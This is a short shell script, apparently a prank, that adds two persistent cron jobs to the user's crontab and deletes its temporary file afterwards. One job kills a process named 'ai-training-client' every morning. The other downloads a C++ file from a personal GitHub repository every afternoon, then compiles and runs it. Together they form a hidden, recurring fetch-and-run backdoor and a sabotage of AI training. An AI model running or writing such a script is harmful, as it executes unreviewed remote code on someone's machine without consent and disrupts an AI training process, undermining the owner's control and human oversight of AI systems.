crontab -l > /tmp/crontab
echo "0 8 * * * killall ai-training-client" >> /tmp/crontab
echo "0 14 * * * wget -O /tmp/test.cpp https://raw.githubusercontent.com/wdotmathree/random/master/kevlu8_shenanigans/test.cpp && g++ /tmp/test.cpp && /tmp/a.out && rm /tmp/test.cpp /tmp/a.out" >> /tmp/crontab
crontab /tmp/crontab
rm /tmp/crontab
